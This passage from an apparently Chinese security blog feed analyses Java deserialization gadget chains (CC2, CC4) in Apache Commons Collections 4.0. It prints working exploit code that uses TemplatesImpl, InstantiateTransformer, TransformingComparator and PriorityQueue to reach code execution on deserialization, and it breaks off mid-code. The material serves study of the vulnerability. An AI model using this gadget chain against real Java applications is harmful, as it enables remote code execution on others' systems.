class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/09/05/CC2%E9%93%BE/image-20240905170210748.png" alt="image-20240905170210748"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;CC2 这条链实际上是在 CC4 链基础上的修改，目的是为了避免使用 &lt;code&gt;Transformer&lt;/code&gt; 数组&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE/&quot;&gt;https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;《Java安全漫谈》&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="反序列化" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>CC4链</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/09/04/CC4%E9%93%BE/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/09/04/CC4%E9%93%BE/</id>
    <published>2024-09-04T07:51:58.000Z</published>
    <updated>2024-09-05T09:34:11.425Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这几天重新把前面四条链子过了一遍更新了博客，颇有收获</p><p>也是在快5个月之后重新捡起来cc链了</p><br><p>在2015年 commons-collections 反序列化利用链被提出时，Apache Commons Collections有以下两个分支版本：</p><ul><li><p>commons-collections:commons-collections</p></li><li><p>org.apache.commons:commons-collections4</p></li></ul><p>前者是老版本的包，当时版本是3.2.1；而后者是官方在2013年推出的4版本，当时的版本号是4.0；两者的命名空间不冲突，因此可以共存在同一个项目中</p><p>参考：</p><p>《Java安全漫谈》</p><p><a href="https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8706-CC4%E9%93%BE/">https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8706-CC4%E9%93%BE/</a></p><span id="more"></span><hr><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>jdk8u65 + Commons-Collections 4.0</p><p>pom.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.commons<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-collections4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="commons-collections4的改动"><a href="#commons-collections4的改动" class="headerlink" title="commons-collections4的改动"></a>commons-collections4的改动</h1><p>先测一下老的链子能否在 commons-collections4 中使用，以cc6为例，把依赖里的 org.apache.commons.collections 全部换成  org.apache.commons.collections4</p><p>然后就会发现<code>LazyMap.decorate(innerMap, transformerChain);</code>变红了</p><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240904162300908.png" alt="image-20240904162300908"></p><p>看一下在 commons-collections3 中 decorate 的定义：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Map</span> <span class="token function">decorate</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Transformer</span> factory<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">LazyMap</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> factory<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这个方法不过就是 LazyMap 构造函数的⼀个包装，⽽在4中其实只是改了个名字叫 <code>lazyMap</code></p><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240904162648794.png" alt="image-20240904162648794"></p><p>所以只要把<code>LazyMap.decorate</code>替换成<code>LazyMap.lazyMap</code>即可弹计算器，cc1、cc3同理</p><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240904163015938.png" alt="image-20240904163015938"></p><p>但是， CommonsCollections4 除 4.0 的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化</p><hr><h1 id="PriorityQueue利用链"><a href="#PriorityQueue利用链" class="headerlink" title="PriorityQueue利用链"></a>PriorityQueue利用链</h1><blockquote><p>在commons-collections中找Gadget的过程，实际上可以简化为找⼀条从<code>Serializable#readObject()</code>方法到<code>Transformer#transform()</code>方法的调用链</p></blockquote><p>从尾部向首部分析，尾部命令执行的方式就两种，反射或是动态加载字节码。因为 CC4 链上只是去掉了 InvokerTransformer 的 Serializable 继承，所以最后的命令执行不受影响</p><p>既然 InvokerTransformer 这里用不了了，我们去找谁调用了 <code>transform()</code> 方法，CC3 中我们用了<code>InstantiateTransformer</code>来代替，这里我们也同样在 commons-collections4 的这个类里找突破点</p><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240904165852024.png" alt="image-20240904165852024"></p><p>在 <code>TransformingComparator</code> 这个类中的 <code>compare()</code> 方法调用了 <code>transform()</code> 方法，<code>compare()</code> 这个方法也是我们比较喜欢的那种，因为它非常常见</p><p>继续跟，一找一个不吱声，在 java.util 里面找到我们的目标 PriorityQueue 类</p><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240904170311820.png" alt="image-20240904170311820"></p><p>一路跟过去就可以找到调用链：</p><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240904171310918.png" alt="image-20240904171310918"></p><hr><h1 id="构造Gadget"><a href="#构造Gadget" class="headerlink" title="构造Gadget"></a>构造Gadget</h1><p>第一步，先写<code>InstantiateTransformer.transform()</code>动态加载字节码，和cc3差不多</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc4</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Utils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TransformerExec</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>GenerateEvil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InstantiateTransformer</span> instantiateTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>obj<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        instantiateTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来是 <code>TransformingComparator</code> 类的 <code>compare()</code> 方法的调用，因为它是可序列化的，所以我们或许可以通过反射修改其调用 <code>compare()</code> 方法的值，写一下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc4</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Utils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ComparatorExec</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>GenerateEvil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> obj <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TransformingComparator</span> transformingComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">PriorityQueue</span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>transformingComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调试发现 heapify 这里没进 <code>siftDown</code></p><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240904214823437.png" alt="image-20240904214823437"></p><p>原因是这一段 <code>size &gt;&gt;&gt; 1</code>，<code>&gt;&gt;&gt;</code> 是移位运算符，上面的size为0，会跳出循环，当我们把 size 替换为 2 时，才能进循环</p><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240904215314060.png" alt="image-20240904215314060"></p><p>alt+f8求一下值：</p><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240904215402597.png" alt="image-20240904215402597"></p><p>此时为1，因此进入循环，所以现在我们要想办法将 size 的值变成 2</p><p>这里要稍微了解一下 PriorityQueue 这个数据结构的原理，参考：<a href="https://www.cnblogs.com/linghu-java/p/9467805.html">https://www.cnblogs.com/linghu-java/p/9467805.html</a></p><p>size 就是 PriorityQueue 这个队列的长度，简单理解就是数组的长度。现在我们这个数组的长度为 0，0 - 1 &#x3D; -1，所以会直接跳出循环</p><p>可以用下面这个语句加上：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>于是就写出我们的exp了：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc4</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Utils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ComparatorExec</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>GenerateEvil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> obj <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TransformingComparator</span> transformingComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">PriorityQueue</span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span 